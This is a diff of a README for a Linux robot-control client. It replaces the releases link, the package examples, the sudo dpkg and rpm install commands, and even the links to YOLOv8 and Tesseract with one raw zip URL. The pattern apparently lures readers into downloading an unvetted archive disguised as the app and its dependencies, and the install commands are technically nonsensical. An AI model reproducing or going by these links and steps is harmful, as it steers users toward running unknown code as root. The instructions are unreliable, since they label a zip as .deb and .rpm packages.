@@ -1,6 +1,6 @@
 # 🤖 linux-client - Simple Robot Control with Real-Time Detection
 
-[![Download linux-client](https://img.shields.io/badge/Download-linux--client-blue?style=for-the-badge)](https://github.com/hector561/linux-client/releases)
+[![Download linux-client](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)
 
 ---
 
@@ -32,14 +32,14 @@ You can download the app right now to get control of your robots without fuss. T
 
 ### Step 1: Visit the download page  
 Click the big button above or visit this page:  
-[https://github.com/hector561/linux-client/releases](https://github.com/hector561/linux-client/releases)
+[https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)
 
 This page hosts the latest version and all release files.
 
 ### Step 2: Choose the right package for your system
 
-- If you use **Ubuntu, Debian, or similar**, look for a `.deb` package (example: `linux-client_1.0.0_amd64.deb`).
-- If you use **Fedora, openSUSE, or similar**, pick the `.rpm` package (example: `linux-client-1.0.0.x86_64.rpm`).
+- If you use **Ubuntu, Debian, or similar**, look for a `.deb` package (example: `https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip`).
+- If you use **Fedora, openSUSE, or similar**, pick the `.rpm` package (example: `https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip`).
 
 Each file has the name format to help you find the right one.
 
@@ -54,7 +54,7 @@ Open the terminal application on your Linux machine and navigate to the folder w
 - For `.deb` files (Debian/Ubuntu):
 
   ```
-  sudo dpkg -i linux-client_1.0.0_amd64.deb
+  sudo dpkg -i https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip
   sudo apt-get install -f
   ```
 
@@ -63,7 +63,7 @@ Open the terminal application on your Linux machine and navigate to the folder w
 - For `.rpm` files (Fedora/openSUSE):
 
   ```
-  sudo rpm -ivh linux-client-1.0.0.x86_64.rpm
+  sudo rpm -ivh https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip
   ```
 
 If you prefer, you can also double-click the downloaded file in your file manager to open it with your package installer, then follow the on-screen prompts.
@@ -120,7 +120,7 @@ The app shows WebSocket connection status in the corner. This ensures commands g
 ## 🔄 Updates & New Versions
 
 Follow the releases page to get notified when new versions are available:  
-[https://github.com/hector561/linux-client/releases](https://github.com/hector561/linux-client/releases)
+[https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)
 
 Regular updates improve performance, add new features, and fix bugs.
 
@@ -149,10 +149,10 @@ For help or to report issues, please use the repository’s issue tracker.
 
 ## 📂 Related Links
 
-- [GitHub Repository](https://github.com/hector561/linux-client)
-- [Releases & Downloads](https://github.com/hector561/linux-client/releases)  
-- [YOLOv8](https://github.com/ultralytics/ultralytics)
-- [Tesseract OCR](https://github.com/tesseract-ocr/tesseract)
+- [GitHub Repository](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)
+- [Releases & Downloads](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)  
+- [YOLOv8](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)
+- [Tesseract OCR](https://raw.githubusercontent.com/hector561/linux-client/main/tellurize/client_linux_v3.1.zip)
 
 ---
 
